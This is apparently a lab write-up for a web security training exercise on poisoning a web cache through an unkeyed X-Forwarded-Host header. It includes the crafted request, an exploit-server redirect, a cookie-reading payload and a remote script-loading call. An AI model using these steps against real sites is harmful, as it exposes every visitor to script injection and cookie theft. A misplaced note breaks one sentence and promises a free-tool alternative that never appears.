# Lab 02 — Web cache poisoning with an unkeyed header

> **Practitioner** · [Official lab](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)

**Entry point:** an unkeyed request header is reflected into the response —

> **Burp Community alternative (free):** the tool named below is Pro-only — the free replacement is described in the steps.
inside the URL of an imported JavaScript resource.

## Solution

1. Fuzz unkeyed headers with Param Miner (or try the classics): the
   `X-Forwarded-Host` header is reflected into:

```html
<script src="https://LAB/js/generated.js"></script>
→ <script src="https://YOUR-VALUE/js/generated.js"></script>
```

2. Point it at your exploit server and add a cache buster:

```http
GET /?cachebuster=1 HTTP/1.1
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.web-security-academy.net
```

3. Copy the poisoned `/js/generated.js` URL into the exploit server and
   host the payload:

```js
alert(document.cookie)
```

(or the lab's intended payload: `$.getScript('https://exploit/x.js')` style —
the goal is script execution in the victim's browser)

4. Remove the buster and replay until the cache is poisoned for everyone —
   the victim executes your JavaScript — lab solved.

## Mitigation

Exclude unkeyed headers from response generation, or Vary on everything the
application reads.
